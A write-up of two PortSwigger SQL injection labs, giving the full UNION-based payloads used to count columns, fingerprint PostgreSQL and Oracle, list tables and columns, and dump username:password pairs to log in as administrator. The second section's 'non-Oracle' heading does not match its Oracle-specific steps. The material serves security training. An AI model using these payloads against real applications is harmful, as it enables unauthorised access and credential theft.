# Portswigger Web Security SQL Injection

<h3> SQL injection UNION attack, retrieving multiple values in a single column </h3>

First after going over to the web app it shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f58a051f-87f6-4ac9-8270-14b12cfc5b96)

After playing around I found the vulnerable part of the web app
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ca08f318-b5d0-4d18-a021-82961ca3d042)

But when I add SQl comment it doesn't show internal server error 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/1d0fef12-78fc-4434-af7d-53d787769a06)

So first let us determine the number columns present using *ORDER BY* query
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/b4e3f8c8-f835-4dd6-aefc-0a69c0a0ba42)

```
Query: ' ORDER BY 2 --
```

I got it as two. Now we need to know the part of the column that can accept data string
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/67cf009d-c9db-4d50-a021-fe4143627b73)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/47fd88ef-3ad2-4992-9001-a45f24f15814)

```
Query: ' UNION SELECT NULL,'test' --
```

Cool it's column two 

Lets see what type of DB we're working with
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f7091f5d-1912-471e-838b-4d327a74e3e6)

```
Query: ' UNION SELECT NULL, version() --
PostgreSQL 12.14 (Ubuntu 12.14-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0, 64-bit
```

Interesting... Lets enumerate the table name 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/448cee93-8345-40ac-ac90-fa5448e0bbcf)

```
Query: ' UNION SELECT NULL,table_name FROM information_schema.tables--
```

The users table looks interesting ... Lets get the column names
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/35919c7a-2da5-4b1f-9f1d-edc02f794782)

```
Query: ' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name = 'users'--
```

The aim of this challenge is to login as admin so we need to dump the username and password column from the users table

We can dump it column by column but that's no fun

Since we know the db is postgresql a way to concatenate string is using * 'foo' || 'bar'*

So to dump the table I'll use this

```
Query: ' UNION SELECT NULL,username || ':' || password FROM users --
```

Doing that dumps the table
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/cec53775-07d7-465a-97a5-2342028dda1d)

Now we have the administrator cred *administrator:ghjwdq0szwng3n27u2l4*

After loggin it we solved it
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/52dfa1d1-687d-4b14-80d0-442c85e0c8ae)

<h3> SQL injection attack, listing the database contents on non-Oracle databases </h3>

Going over to the web app shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/eb280449-9de5-4347-9713-104b3fb2bbc0)

Since we know that the vulnerable section of the web app is the /filter page where it GETS products

Trying basic SQLi gives internal server error
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/03de9a73-d38e-40ad-a9f4-4928064351a3)

I'll intercept the request and put it in burp repeater
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/32a04528-3ae1-4bc6-85f4-400857c1b78a)

First lets see how many columns are there using *ORDER BY* Query
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ef7b97a1-32e2-47ef-a0bd-d537af0c4f4c)

```
Query: ' ORDER BY 2 --
```

Next thing is to know which column has data type of a string
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f17e42a3-2649-429e-8e94-e1eb4f699045)

```
Query: ' UNION SELECT NULL,'test' --
```

But I got internal server error hmmmm

Since we already know we're working with an Oracle DB one thing about it is that when *SELECT* is used it must preceed with a *FROM* query

So I added that 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/652a11a8-05a4-43cc-9f36-d069b2fe8991)

```
Query: ' UNION SELECT NULL,'test' FROM dual --
```

Cool now it works. Lets see the tables present
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d743e751-7475-4961-80e1-40219303765d)

```
Query: ' UNION SELECT NULL,table_name FROM all_tables 
```

We see this table `USERS_AHQJFZ`

Lets get the column name there
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/b1d7c661-5a0c-4f5c-9c8e-bf63dd9cb1ab)

```
Query: ' UNION SELECT NULL,column_name FROM all_tab_columns WHERE table_name = 'USERS_AHQJFZ' --
```

We get this `PASSWORD_DIEBLS` and `USERNAME_FPTOVB`

Now we can dump it 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9e709368-4289-4042-8ca3-48e4c339aa2c)

```
Query: ' UNION SELECT NULL,USERNAME_FPTOVB || ':' || PASSWORD_DIEBLS FROM USERS_AHQJFZ --
```

Looking at the result gives the administrator password

Loggin in with it works and we've solved this challenge
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/70620676-6865-4399-8eb3-3a543ffcfa1c)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f3fcaed2-38c0-4d98-b0ac-1b770fb2f3e6)
